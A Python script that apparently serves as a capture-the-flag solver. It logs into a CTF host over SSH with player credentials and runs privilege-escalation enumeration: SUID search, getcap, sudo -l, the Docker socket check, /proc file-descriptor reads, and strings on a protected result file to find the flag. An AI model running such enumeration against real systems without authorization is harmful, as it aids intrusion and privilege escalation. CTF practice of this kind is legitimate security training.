#!/usr/bin/env python3
"""
TIER 3: Privilege Escalation / Container Escape
"""
import paramiko

HOST = "instance.ctf.tdho.st"
PORT = 32990
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=15)
    return (stdout.read() + stderr.read()).decode()

print("="*70)
print("TIER 3: PRIVILEGE ESCALATION")
print("="*70)

# 1. Check SUID binaries
print("\n[1] Checking SUID binaries...")
suid = cmd("find / -perm -4000 -type f 2>/dev/null")
print(suid)

# 2. Check capabilities
print("\n[2] Checking capabilities...")
caps = cmd("getcap -r / 2>/dev/null")
if caps.strip():
    print(caps)
else:
    print("  getcap not available or no capabilities found")

# 3. Check sudo
print("\n[3] Checking sudo permissions...")
sudo_check = cmd("sudo -l 2>&1")
print(sudo_check[:500])

# 4. Check Docker socket
print("\n[4] Checking Docker socket...")
docker_sock = cmd("ls -la /var/run/docker.sock 2>&1")
print(docker_sock)

# 5. Check if we can access .sync via symlink or other means
print("\n[5] Trying alternative access to .sync directory...")
print(cmd("ls -la /opt/mc/ 2>&1"))
print(cmd("stat /opt/mc/.sync 2>&1"))

# 6. Check process permissions
print("\n[6] Checking sync-loop process (PID 16)...")
print(cmd("ps aux | grep sync"))
print(cmd("ls -la /proc/16/ 2>&1 | head -20"))

# 7. Try reading sync.result via /proc
print("\n[7] Trying to read via /proc filesystem...")
proc_fd = cmd("find /proc/16/fd -type l 2>/dev/null | xargs -I {} sh -c 'readlink {} 2>/dev/null'")
print(proc_fd)

# 8. Check if there's a way to change directory permissions
print("\n[8] Checking directory ownership...")
print(cmd("ls -ldn /opt/mc/.sync 2>&1"))

# 9. Look for world-writable directories that might be mounted
print("\n[9] Checking mounts...")
print(cmd("cat /proc/mounts | grep /opt/mc"))

# 10. Try using strings on the directory (sometimes works)
print("\n[10] Trying strings on sync.result...")
strings_out = cmd("strings /opt/mc/.sync/sync.result 2>&1")
if "tdho{" in strings_out or "FLAG=" in strings_out:
    print("\n" + "="*70)
    print("🎉 FLAG FOUND via strings!")
    print("="*70)
    print(strings_out)
    print("="*70)

ssh.close()
